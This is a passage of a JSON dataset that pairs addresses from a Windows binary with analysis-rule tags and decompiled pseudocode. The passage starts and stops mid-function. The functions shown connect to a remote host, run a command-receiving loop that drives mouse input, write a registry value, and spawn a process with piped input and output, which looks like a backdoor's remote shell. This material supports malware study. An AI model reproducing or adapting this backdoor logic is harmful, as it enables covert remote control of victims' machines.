fcn.00405cd0();\n    uStack120 = 0x4814d9;\n    fcn.004040ac();\n    uStack120 = 0x4814de;\n    fcn.0040305c();\n    uStack120 = 0x4814e6;\n    fcn.004810b0();\n    uStack120 = 0x4814f4;\n    fcn.00405974();\n    if (!uVar5) {\n        var_50h = *0x494780;\n        uStack120 = 0x481513;\n        fVar6 = fcn.0040bcc4();\n        _var_28h = fVar6;\n        var_24h = _var_28h >> 0x20;\n        uStack120 = var_24h;\n        uStack124 = var_28h;\n        uStack128 = 0x48152d;\n        fcn.0040c8f8();\n        uStack128 = 0x48171c;\n        uStack132 = 0x48153c;\n        fcn.00409d70();\n        uStack132 = var_58h;\n        uStack136 = 0x481744;\n        uStack144 = 0x481704;\n        uStack148 = 0x481710;\n        uStack152 = *0x494780;\n        uStack156 = 0x481710;\n        puStack160 = 0x481569;\n        fcn.004058e0();\n        puStack160 = 0x481576;\n        fcn.00405cd0();\n        puStack160 = 0x48157b;\n        fcn.004040ac();\n        puStack160 = 0x481580;\n        fcn.0040305c();\n        puStack160 = 0x48158d;\n        fcn.00405584();\n        uVar5 = 1;\n        uStack164 = 0x48163c;\n        uStack168 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff58;\n        puStack160 = &stack0xfffffffc;\n        fcn.004735e8();\n        fcn.00405974();\n        if (uVar5) {\n            fcn.0048adcc();\n            fcn.00480d08(0x4816dc, var_64h);\n            fcn.004058e0(var_68h);\n            uVar7 = fcn.00480fec();\n            fcn.004735e8();\n            in_stack_ffffff40 = 0x481603;\n            iVar3 = fcn.00409edc();\n            iVar8 = uVar7 >> 0x20;\n            iVar4 = (iVar3 << 10) >> 0x1f;\n            if (iVar4 == iVar8) {\n                if (iVar3 << 10 < uVar7) {\ncode_r0x0048161a:\n                    in_stack_ffffff40 = 0;\n                    in_stack_ffffff34 = 0;\n                    sub.kernel32.dll_CreateThread_1(0, 0, fcn.004810d4, 0, 0, *0x494c2c);\n                }\n            }\n            else if (iVar4 < iVar8) goto code_r0x0048161a;\n        }\n        *in_FS_OFFSET = in_stack_ffffff34;\n    }\n    fcn.00403918();\n    fcn.0040305c();\n    fcn.00405530();\ncode_r0x0048165f:\n    fcn.00405818();\n    *in_FS_OFFSET = in_stack_ffffff40;\n    fcn.00405584(0x48168e);\n    return;\n}\n",
        "token_count": 2254
    },
    "004821a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004821a0 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack1076 = &stack0xfffffffc;\n    var_420h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack1080 = 0x482302;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1084;\n    fcn.00405728();\n    fcn.00405b28(&var_420h);\n    fcn.00405a44();\n    uVar1 = fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    uVar2 = fcn.00409edc();\n    fcn.004820c4();\n    iVar3 = sub.wsock32.dll_socket(2, 2, 0);\n    if (iVar3 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00403af4();\n    var_1ch._0_2_ = 2;\n    var_18h = sub.wsock32.dll_inet_addr(uVar1);\n    var_1ch._2_2_ = sub.wsock32.dll_htons(uVar2);\n    if (var_18h == -1) {\n        iVar4 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar4 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_18h = ***(iVar4 + 0xc);\n    }\n    iVar4 = var_4h;\n    if (var_4h != 0) {\n        iVar4 = *(var_4h + -4);\n    }\n    sub.wsock32.dll_sendto(iVar3, &var_4h, iVar4, 0, &var_1ch, 0x10);\n    fcn.00405728();\n    sub.kernel32.dll_Sleep_2(1000);\n    sub.wsock32.dll_closesocket(iVar3);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 629
    },
    "004824b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004824b0(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint buf;\n    uint s;\n    int32_t var_4h;\n    \n    puStack1048 = 0x4824c9;\n    s = in_EAX;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack1052 = 0x482542;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    fcn.00403af4();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        puVar1 = &fcn.004824b0::buf;\n        do {\n            *puVar1 = *(var_4h + iVar3);\n            iVar3 = iVar3 + 1;\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    sub.wsock32.dll_send(s, &fcn.004824b0::buf, 0x400, 0);\n    *in_FS_OFFSET = s;\n    fcn.00405530(0x482549);\n    return;\n}\n",
        "token_count": 378
    },
    "004839ec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004839ec(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack24 = 0x4839ff;\n    fcn.004059cc();\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    if (0 < iVar2) {\n        do {\n    // switch table (55 cases) at 0x483a87\n            switch(*(in_EAX + -1 + iVar2)) {\n            case 0x30:\n                break;\n            case 0x31:\n                break;\n            case 0x32:\n                break;\n            case 0x33:\n                break;\n            case 0x34:\n                break;\n            case 0x35:\n                break;\n            case 0x36:\n                break;\n            case 0x37:\n                break;\n            case 0x38:\n                break;\n            case 0x39:\n                break;\n            case 0x41:\n                break;\n            case 0x42:\n                break;\n            case 0x43:\n                break;\n            case 0x44:\n                break;\n            case 0x45:\n                break;\n            case 0x46:\n                break;\n            case 0x61:\n                break;\n            case 0x62:\n                break;\n            case 99:\n                break;\n            case 100:\n                break;\n            case 0x65:\n                break;\n            case 0x66:\n            }\n            iVar1 = in_EAX;\n            if (in_EAX != 0) {\n                iVar1 = *(in_EAX + -4);\n            }\n            if (iVar1 != iVar2) {\n                iVar1 = in_EAX;\n                if (in_EAX != 0) {\n                    iVar1 = *(in_EAX + -4);\n                }\n                if (0 < iVar1) {\n                    do {\n                        iVar1 = iVar1 + -1;\n                    } while (iVar1 != 0);\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    uStack24 = 0x483be3;\n    uStack28 = 0x483bdb;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 585
    },
    "004844a4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.004844a4(void)\n\n{\n    uint *in_EAX;\n    uint arg_8h;\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_130h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_114h;\n    uint uStackY156;\n    uint uStackY152;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    iVar1 = 0x2b;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    puVar3 = &fcn.004844a4::var_138h;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    for (iVar1 = 0x4a; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *in_EAX;\n        in_EAX = in_EAX + 1;\n        puVar3 = puVar3 + 1;\n    }\n    uStack32 = 0x484689;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.00405530();\n    for (uVar2 = 0; *(&fcn.004844a4::var_114h + (uVar2 & 0xff)) != '\\0'; uVar2 = uVar2 + 1) {\n        fcn.00405718();\n        fcn.00405818();\n    }\n    fcn.00484048();\n    fcn.004840d8();\n    if (var_8h != 0) {\n        var_8h = *(var_8h + -4);\n    }\n    if (var_8h == 0) {\n        fcn.004055c8();\n    }\n    if (var_ch != 0) {\n        var_ch = *(var_ch + -4);\n    }\n    if (var_ch == 0) {\n        fcn.004055c8();\n    }\n    fcn.004843ec();\n    fcn.00409e5c(var_124h);\n    fcn.00409e5c(var_130h);\n    fcn.00409e5c(var_10h);\n    fcn.00409e5c(var_120h);\n    fcn.00484288();\n    arg_8h = sub.kernel32.dll_GetCurrentProcessId();\n    uStackY152 = 0x48464c;\n    fcn.00409e5c(arg_8h);\n    uStackY152 = var_158h;\n    uStackY156 = 0x48465e;\n    fcn.004058e0();\n    *in_FS_OFFSET = uStackY152;\n    fcn.00405554();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 809
    },
    "00485150": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00485150(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint phkResult;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack32 = 0x485167;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack32 = 0x48516f;\n    fcn.004059cc();\n    uStack36 = 0x48520a;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x4851de;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack32 = &stack0xfffffffc;\n    sub.advapi32.dll_RegOpenKeyA(0x80000001, 0x485218, &fcn.00485150::phkResult);\n    iVar2 = var_8h;\n    if (var_8h != 0) {\n        iVar2 = *(var_8h + -4);\n    }\n    uVar1 = fcn.004059dc(iVar2 + 1);\n    uVar3 = 0;\n    uVar1 = fcn.004059dc(0, 1, uVar1);\n    sub.advapi32.dll_RegSetValueExA(phkResult, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = phkResult;\n    *in_FS_OFFSET = uVar3;\n    fcn.00405554(0x485211);\n    return;\n}\n",
        "token_count": 434
    },
    "00485248": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00485248(void)\n\n{\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uchar uVar1;\n    int32_t in_stack_ffffffbc;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    puStack32 = 0x48525f;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    uStack36 = 0x485356;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x48532a;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack32 = &stack0xfffffffc;\n    fcn.00421708();\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00422068();\n    uVar1 = var_8h == 0 || var_8h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar1) {\n        fcn.00405818();\n        var_4h = in_stack_ffffffbc;\n    }\n    else {\n        fcn.004058e0(var_4h, 0x4853c0, var_8h);\n    }\n    fcn.00422008();\n    fcn.00404650();\n    *in_FS_OFFSET = var_4h;\n    *in_FS_OFFSET = &fcn.00485248::var_ch;\n    uStack48 = 0x48535d;\n    iStack52 = 0x485355;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 457
    },
    "00486374": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004863c8)\n\nvoid fcn.00486374(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x48642a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.004055c8();\n    fcn.004613d8();\n    fcn.004055c8();\n    iVar3 = 0;\n    bVar1 = false;\n    while (bVar1) {\n        fcn.00405a3c(iVar3, 0);\n        uStack44 = *(in_EAX + 0x40);\n        iVar2 = sub.wsock32.dll_send();\n        if (iVar2 < 1) break;\n        iVar3 = iVar3 - iVar2;\n        bVar1 = 0 < iVar3;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x486431;\n    uStack40 = 0x486421;\n    fcn.00405530();\n    uStack40 = 0x486429;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 337
    },
    "004865e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00486847)\n// WARNING: Removing unreachable block (ram,0x00486858)\n\nvoid fcn.004865e0(void)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack4196;\n    int32_t iStack4192;\n    uchar *puStack4188;\n    uint name;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4188 = &stack0xfffffffc;\n    iVar3 = 2;\n    do {\n        iVar2 = iVar3;\n        iVar3 = iVar2 + -1;\n    } while (iVar3 != 0);\n    iStack4192 = 0x4868d4;\n    iStack4196 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffef9c;\n    iVar3 = 0;\ncode_r0x0048662b:\n    do {\n        iVar4 = (**(***0x494808 + 0x14))();\n        if (iVar4 + -1 < iVar3) {\n            iVar3 = 0;\n        }\n        fcn.00465178();\n        iVar4 = fcn.004059dc();\n        **0x494b30 = iVar4;\n        uVar1 = fcn.0046509c();\n        **0x4949d4 = uVar1;\n        iVar3 = iVar3 + 1;\n        sub.kernel32.dll_Sleep_2();\n        while (iVar4 = sub.user32.dll_PeekMessageA(),  iVar4 != 0) {\n            sub.user32.dll_TranslateMessage();\n            sub.user32.dll_DispatchMessageA();\n        }\n        fcn.00403af4();\n        iStack4196 = 2;\n        iVar4 = sub.wsock32.dll_socket();\n        **0x494af0 = iVar4;\n    } while (**0x494af0 == -1);\n    sub.wsock32.dll_htons();\n    iVar4 = sub.wsock32.dll_inet_addr();\n    if (iVar4 == -1) goto code_r0x00486717;\n    goto code_r0x00486736;\ncode_r0x00486717:\n    iStack4196 = **0x494b30;\n    iVar4 = sub.wsock32.dll_gethostbyname();\n    if (iVar4 != 0) {\ncode_r0x00486736:\n        iVar4 = **0x494af0;\n        puStack4188 = 0x486749;\n        iVar5 = sub.wsock32.dll_connect();\n        if (iVar5 == 0) {\n            if (unaff_ESI != 0) {\n                puStack4188 = 0x48675c;\n                fcn.0041ff18();\n            }\n            puStack4188 = 0x48676a;\n            unaff_ESI = fcn.0041fa34();\n            *(unaff_ESI + 0xf) = 1;\n            puStack4188 = 0x486779;\n            fcn.0041fc40();\n            puStack4188 = 0x486788;\n            fcn.004864b4();\n            puStack4188 = 0x486791;\n            fcn.004864b8();\n            puStack4188 = 0x486798;\n            fcn.0041fef0();\n            **0x494a74 = 1;\n            while( true ) {\n                if (*(iVar2 + 0xd) != '\\0') {\n                    *in_FS_OFFSET = iVar4;\n                    fcn.00405530();\n                    fcn.00405d40();\n                    fcn.00405530();\n                    fcn.00405530();\n                    return;\n                }\n                puStack4188 = 0x4867b7;\n                fcn.00403af4();\n                puStack4188 = NULL;\n                iStack4192 = 0x2000;\n                iStack4196 = **0x494af0;\n                iVar5 = sub.wsock32.dll_recv();\n                if (iVar5 < 1) break;\n                fcn.00405e3c();\n                fcn.00409bd0();\n                fcn.004057d4();\n                fcn.004616b4();\n                fcn.004055c8();\n            }\n            fcn.00486528();\n        }\n        else {\n            if (unaff_ESI != 0) {\n                puStack4188 = 0x486877;\n                fcn.0041ff18();\n            }\n            puStack4188 = 0x1;\n            iStack4192 = **0x494af0;\n            iStack4196 = 0x486886;\n            sub.wsock32.dll_shutdown();\n            iStack4196 = **0x494af0;\n            sub.wsock32.dll_closesocket();\n        }\n    }\n    goto code_r0x0048662b;\n}\n",
        "token_count": 1109
    },
    "0048851c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048851c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack8264;\n    uint uStack8260;\n    uint uStack8256;\n    uint uStack8252;\n    uint uStack8248;\n    uint uStack8244;\n    uint uStack8240;\n    ushort uStack8236;\n    ushort uStack8234;\n    int32_t iStack8232;\n    uint auStack8220 [986];\n    uint uStack4276;\n    uint uStack4272;\n    uint *puStack4268;\n    uint *puStack4264;\n    uint *puStack4260;\n    uint *puStack4256;\n    uint *puStack4252;\n    uchar *puStack4248;\n    int32_t iStack4244;\n    uchar *puStack4240;\n    uchar *puStack4236;\n    uint uStack4232;\n    uchar *puStack4228;\n    uchar *puStack4224;\n    uint uStack4220;\n    uint uStack4216;\n    uint uStack4212;\n    uint32_t uStack4208;\n    uint uStack4204;\n    uint uStack4200;\n    uint uStack4196;\n    int32_t iStack4192;\n    uint uStack4188;\n    uchar *puStack4184;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4184 = &stack0xfffffffc;\n    iVar2 = 2;\n    do {\n        iVar1 = iVar2;\n        iVar2 = iVar1 + -1;\n    } while (iVar1 + -1 != 0);\n    uStack8264 = 0;\n    uStack8260 = 0;\n    uStack8256 = 0;\n    uStack8252 = 0;\n    uStack8248 = 0;\n    uStack8240 = 0;\n    uStack8244 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    uStack4188 = 0x488943;\n    iStack4192 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefa0;\n    uStack4196 = 0;\n    uStack4200 = 1;\n    uStack4204 = 2;\n    uStack4208 = 0x488586;\n    iVar2 = sub.wsock32.dll_socket();\n    *(iVar1 + 0x44) = iVar2;\n    if (iVar2 != -1) {\n        uStack8236 = 2;\n        uStack4208 = **0x4949d4;\n        uStack4212 = 0x4885ac;\n        uStack8234 = sub.wsock32.dll_htons();\n        uStack4212 = **0x494b30;\n        uStack4216 = 0x4885c0;\n        iStack8232 = sub.wsock32.dll_inet_addr();\n        if (iStack8232 == -1) {\n            uStack4216 = **0x494b30;\n            uStack4220 = 0x4885d8;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            if (iVar2 == 0) goto code_r0x004888fe;\n            iStack8232 = ***(iVar2 + 0xc);\n        }\n        uStack4220 = 0x10;\n        puStack4224 = &stack0xffffdfd4;\n        puStack4228 = *(iVar1 + 0x44);\n        uStack4232 = 0x488602;\n        sub.wsock32.dll_connect();\n        uStack4232 = 0;\n        puStack4236 = 0x2000;\n        puStack4240 = &stack0xffffdfe4;\n        uStack4216 = *(iVar1 + 0x44);\n        puStack4248 = 0x48861c;\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            puStack4248 = 0x488634;\n            fcn.00409d70();\n            puStack4248 = 0x48864a;\n            fcn.00405864();\n            puStack4248 = 0x48865b;\n            fcn.00475ecc();\n            puStack4248 = NULL;\n            puStack4252 = 0x2000;\n            puStack4256 = &stack0xffffdfe4;\n            uStack4216 = *(iVar1 + 0x44);\n            puStack4264 = 0x488675;\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                while (*(iVar1 + 0xd) == '\\0') {\n                    uStack4220 = 0x488690;\n                    fcn.00403af4();\n                    uStack4220 = 0x4886a2;\n                    fcn.00403af4();\n                    uStack4220 = 0;\n                    puStack4224 = 0x2000;\n                    puStack4228 = &stack0xffffdfe4;\n                    uStack4216 = *(iVar1 + 0x44);\n                    puStack4236 = 0x4886bc;\n                    iVar2 = sub.wsock32.dll_recv();\n                    if (iVar2 < 1) break;\n                    uVar3 = 1;\n                    puStack4240 = 0x4888e7;\n                    iStack4244 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffef6c;\n                    puStack4248 = 0x4886e2;\n                    puStack4236 = &stack0xfffffffc;\n                    fcn.00405728();\n                    puStack4248 = &stack0xffffdfc8;\n                    puStack4252 = 0x4886fb;\n                    fcn.00405a44();\n                    puStack4252 = 0x48870b;\n                    fcn.00405974();\n                    if (uVar3) {\n                        puStack4252 = &fcn.0048851c::var_8h;\n                        puStack4256 = 0x48872f;\n                        fcn.00405a44();\n                        puStack4256 = NULL;\n                        puStack4260 = 0x488739;\n                        puStack4260 = fcn.00409edc();\n                        puStack4264 = NULL;\n                        puStack4268 = NULL;\n                        uStack4272 = 0x800;\n                        uStack4276 = 0x488748;\n                        sub.user32.dll_mouse_event();\n                    }\n                    else {\n                        puStack4252 = &stack0xffffdfc4;\n                        puStack4256 = 0x488766;\n                        fcn.00405a44();\n                        puStack4256 = 0x488776;\n                        fcn.00405974();\n                        if (uVar3) {\n                            puStack4256 = &fcn.0048851c::var_8h;\n                            puStack4260 = 0x48879a;\n                            fcn.00405a44();\n                            puStack4260 = 0x4887a2;\n                            fcn.00461b8c();\n                        }\n                        else {\n                            puStack4256 = &stack0xffffdfc0;\n                            puStack4260 = 0x4887c0;\n                            fcn.00405a44();\n                            puStack4260 = 0x4887d0;\n                            fcn.00405974();\n                            if (uVar3) {\n                                puStack4260 = &fcn.0048851c::var_8h;\n                                puStack4264 = 0x488800;\n                                fcn.00405a44();\n                                puStack4264 = 0x48880a;\n                                fcn.00488f80();\n                            }\n                            else {\n                                puStack4260 = &stack0xffffdfbc;\n                                puStack4264 = 0x488828;\n                                fcn.00405a44();\n                                puStack4264 = 0x488838;\n                                fcn.00405974();\n                                if (uVar3) {\n                                    puStack4264 = &fcn.0048851c::var_8h;\n                                    puStack4268 = 0x488868;\n                                    fcn.00405a44();\n                                    puStack4268 = 0x488875;\n                                    fcn.00488f80();\n                                }\n                                else {\n                                    puStack4264 = &stack0xffffdfb8;\n                                    puStack4268 = 0x488890;\n                                    fcn.00405a44();\n                                    puStack4268 = 0x4888a0;\n                                    fcn.00405974();\n                                    if (uVar3) {\n                                        puStack4268 = &fcn.0048851c::var_8h;\n                                        uStack4272 = 0x4888d0;\n                                        fcn.00405a44();\n                                        uStack4272 = 0x4888dd;\n                                        fcn.00488f80();\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    *in_FS_OFFSET = puStack4268;\n                }\n            }\n        }\n    }\ncode_r0x004888fe:\n    uStack4220 = 2;\n    puStack4224 = *(iVar1 + 0x44);\n    puStack4228 = 0x48890c;\n    sub.wsock32.dll_shutdown();\n    puStack4228 = *(iVar1 + 0x44);\n    uStack4232 = 0x488918;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = puStack4228;\n    uStack4220 = 0x48894a;\n    puStack4224 = 0x488935;\n    fcn.00405554();\n    puStack4224 = 0x488942;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2186
    },
    "00489580": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00489580(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack18844;\n    uint auStack18840 [7];\n    uchar auStack18812 [9216];\n    uchar auStack9596 [2872];\n    uint uStack6724;\n    uchar *puStack6720;\n    uchar *puStack6716;\n    uchar *puStack6708;\n    uint uStack6704;\n    uint *puStack6700;\n    uint uStack6696;\n    uint uStack6692;\n    uint uStack6688;\n    uint uStack6684;\n    uchar *puStack6680;\n    uint *puStack6676;\n    uint uStack6672;\n    uchar *puStack6668;\n    uint *puStack6664;\n    uint *puStack6660;\n    uint *puStack6656;\n    uint uStack6652;\n    uint uStack6648;\n    uint uStack6644;\n    uchar *puStack6640;\n    uint *puStack6636;\n    uint *puStack6632;\n    uint uStack6628;\n    uint *puStack6624;\n    uint uStack6620;\n    uint *puStack6616;\n    int32_t iStack6612;\n    uint *puStack6608;\n    uint uStack6604;\n    uint *puStack6600;\n    uint *puStack6596;\n    uint *puStack6592;\n    uint uStack6588;\n    uint uStack6584;\n    uint uStack6580;\n    uchar *puStack6576;\n    uint var_178h;\n    uchar *var_74h;\n    uint var_70h;\n    uint var_64h;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack6576 = &stack0xfffffffc;\n    iVar3 = 4;\n    do {\n        iVar2 = iVar3;\n        iVar3 = iVar2 + -1;\n    } while (iVar2 + -1 != 0);\n    uStack18844 = 0;\n    var_4h = 0;\n    uStack6580 = 0x48984e;\n    uStack6584 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffe648;\n    *(iVar2 + 0x48) = 0;\n    uStack6588 = 0x4895ce;\n    puStack6660 = fcn.00402f00();\n    *puStack6660 = 0xc;\n    puStack6660[2] = 0xffffffff;\n    puStack6660[1] = 0;\n    uStack6588 = 0;\n    puStack6596 = &fcn.00489580::var_ch;\n    puStack6600 = &fcn.00489580::var_8h;\n    uStack6604 = 0x4895f2;\n    puStack6592 = puStack6660;\n    sub.kernel32.dll_CreatePipe();\n    uStack6604 = 0;\n    iStack6612 = iVar2 + 0x40;\n    puStack6616 = &fcn.00489580::var_10h;\n    uStack6620 = 0x489602;\n    puStack6608 = puStack6660;\n    sub.kernel32.dll_CreatePipe();\n    uStack6620 = 0x104;\n    puStack6624 = &fcn.00489580::var_178h;\n    uStack6628 = 0x48985c;\n    puStack6632 = 0x489618;\n    sub.kernel32.dll_GetEnvironmentVariableA();\n    puStack6632 = 0x489627;\n    fcn.00403af4();\n    var_64h = 0x44;\n    var_38h = 0x101;\n    var_34h._0_2_ = 0;\n    var_2ch = var_10h;\n    var_28h = var_ch;\n    var_24h = var_ch;\n    puStack6632 = &fcn.00489580::var_74h;\n    puStack6636 = &fcn.00489580::var_64h;\n    puStack6640 = NULL;\n    uStack6644 = 0;\n    uStack6648 = 0;\n    uStack6652 = 0xffffffff;\n    puStack6664 = &fcn.00489580::var_178h;\n    puStack6668 = NULL;\n    uStack6672 = 0x48966d;\n    puStack6656 = puStack6660;\n    iVar3 = sub.kernel32.dll_CreateProcessA();\n    if (iVar3 != 0) {\n        while (*(iVar2 + 0xd) == '\\0') {\n            puStack6640 = 0x7d0;\n            puStack6676 = 0x48968a;\n            sub.kernel32.dll_Sleep_2();\n            while( true ) {\n                uStack6644 = 1;\n                uStack6648 = 0;\n                uStack6652 = 0;\n                puStack6656 = NULL;\n                puStack6660 = &stack0xffffb668;\n                puStack6664 = 0x4896b8;\n                iVar3 = sub.user32.dll_PeekMessageA();\n                if (iVar3 == 0) break;\n                puStack6664 = &stack0xffffb668;\n                puStack6668 = 0x489698;\n                sub.user32.dll_TranslateMessage();\n                puStack6640 = &stack0xffffb668;\n                uStack6672 = 0x4896a4;\n                sub.user32.dll_DispatchMessageA();\n            }\n            *(iVar2 + 0x48) = 1;\n            puStack6664 = &fcn.00489580::var_18h;\n            puStack6668 = var_74h;\n            uStack6672 = 0x4896cd;\n            sub.kernel32.dll_GetExitCodeProcess();\n            if (var_18h != 0x103) break;\n            uStack6672 = 0x4896e2;\n            fcn.00405530();\n            uStack6672 = 